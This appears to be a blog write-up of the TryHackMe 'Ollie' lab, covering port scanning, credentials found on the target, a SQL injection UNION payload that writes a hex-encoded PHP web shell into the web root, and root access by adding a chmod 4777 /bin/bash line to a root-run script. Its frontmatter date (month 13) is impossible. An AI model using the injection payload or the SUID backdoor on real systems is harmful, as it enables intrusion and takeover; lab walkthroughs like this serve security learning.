---
title: "Ollie"
date: 2025-13-16
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Medium
---

## Enumeration

Lets start with the simple nmap scan and rustscan.
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 11:10 +0545
Nmap scan report for 10.10.17.91 (10.10.17.91)
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
|_  256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/ /immaolllieeboyyy
| http-title: Ollie :: login
|_Requested resource was http://10.10.17.91/index.php?page=login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.16 seconds
```

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1337/tcp open  waste   syn-ack
```

Lets enumerate the port 80.
Hmm we spawned on a login page.
![[Pasted image 20250326111427.png]]

Lets enumerate further.
![[Pasted image 20250326111557.png]]

We might get local file inclusion vulnerability here.
Lets check.
Hmm not working.

Doing directory busting gave us many things.
![[Pasted image 20250326111903.png]]
![[Pasted image 20250326111915.png]]


Found many thing but nothing seems interesting.
![[Pasted image 20250326112416.png]]

Hmm lets also see that port 1337.
![[Pasted image 20250326112455.png]]

Interesting.
Lets move forward.
And we got the creds.
![[Pasted image 20250326112621.png]]
Lets try to login on login page.
```
Username: admin
Password: OllieUnixMontgomery!
```

![[Pasted image 20250326112807.png]]

## Exploit

Hmmm.
After searching for possible exploits of `[phpIPAM IP address management [v1.4.5]`,we can find this.
![[Pasted image 20250326113019.png]]

Hmm it was using a sql injection to upload php shell.
Lets try sql injection to test if it is possible.
![[Pasted image 20250326114401.png]]

We can find this in a edit BGP subnet mapping thing.
And we found exact number of columns.
![[Pasted image 20250326114715.png]]
![[Pasted image 20250326114736.png]]

Hmmm lets try to use that exploit we found on exploitdb.
Or we can do this.
```SQL

" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/evil.php' -- -

```

So what happening here is we are using UNION attack and uploaded hexed php web shell by doing `INTO OUTFILE`  into `/var/www/html/yourfile.php` cause `/var/www/html/` is the root directory of web page.
![[Pasted image 20250326120012.png]]
![[Pasted image 20250326115750.png]]

And we can now use this to execute commands.
![[Pasted image 20250326115844.png]]

Now we can get reverse shell by [revshell.com](https://www.revshells.com/)
![[Pasted image 20250326120130.png]]

And we can also get full tty shell from here.
[full tty shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)

![[Pasted image 20250326120530.png]]

## Privelege Escalation

We can get a some creds here.
![[Pasted image 20250326121029.png]]

But this was not working for user ollie.
After trying and enumerating different thing,there is the password reuse and we can use same password that we got before for user ollie.
![[Pasted image 20250326121429.png]]

Now lets try to became root.
I tried different exploits and tried to find different thing but nothing worked.
Linpeas is also not working.[linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
Lets also try pspy.[pspy](https://github.com/DominicBreuker/pspy)
After seeing and trying different things,we can see this.
![[Pasted image 20250326124201.png]]

Lets see what is it.
Its nothing.
But we can use it to execute command as root.
```
ollie@hackerdog:/tmp$ cat /usr/bin/feedme
#!/bin/bash

chmod 4777 /bin/bash
# This is weird?
ollie@hackerdog:/tmp$

```

Here we are changing the permission of `/bin/bash` ,giving it with setuid.

![[Pasted image 20250326124516.png]]

And Now we are root.
![[Pasted image 20250326124647.png]]

## Done

And done.
![[Pasted image 20250326124744.png]]

Learned lots of things again.
I hope you are okay,take care :).
